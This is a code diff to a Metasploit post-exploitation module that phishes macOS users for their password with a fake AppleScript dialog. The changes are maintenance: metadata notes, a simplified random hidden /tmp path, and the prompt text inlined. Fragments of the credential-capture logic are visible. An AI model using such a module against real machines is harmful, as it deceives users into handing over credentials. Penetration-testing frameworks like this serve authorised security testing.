@@ -25,7 +25,12 @@ class MetasploitModule < Msf::Post
         'References' => [
           ['URL', 'http://blog.packetheader.net/2011/10/fun-with-applescript.html']
         ],
-        'SessionTypes' => [ 'shell', 'meterpreter' ]
+        'SessionTypes' => [ 'shell', 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -79,9 +84,9 @@ class MetasploitModule < Msf::Post
 
     print_status("Running module against #{host}")
 
-    dir = '/tmp/.' + Rex::Text.rand_text_alpha((rand(6..13)))
-    creds_osa = dir + '/' + Rex::Text.rand_text_alpha((rand(6..13)))
-    pass_file = dir + '/' + Rex::Text.rand_text_alpha((rand(6..13)))
+    dir = '/tmp/.' + Rex::Text.rand_text_alpha(6..13)
+    creds_osa = dir + '/' + Rex::Text.rand_text_alpha(6..13)
+    pass_file = dir + '/' + Rex::Text.rand_text_alpha(6..13)
 
     username = cmd_exec('/usr/bin/whoami').strip
     cmd_exec('umask 0077')
@@ -131,10 +136,9 @@ class MetasploitModule < Msf::Post
 
   # applescript that displays the actual password prompt dialog
   def creds_script(pass_file)
-    textcreds = datastore['TEXTCREDS']
-    ascript = %(
+    %(
 set filename to "#{pass_file}"
-set myprompt to "#{textcreds}"
+set myprompt to "#{datastore['TEXTCREDS']}"
 set ans to "Cancel"
 repeat
   try
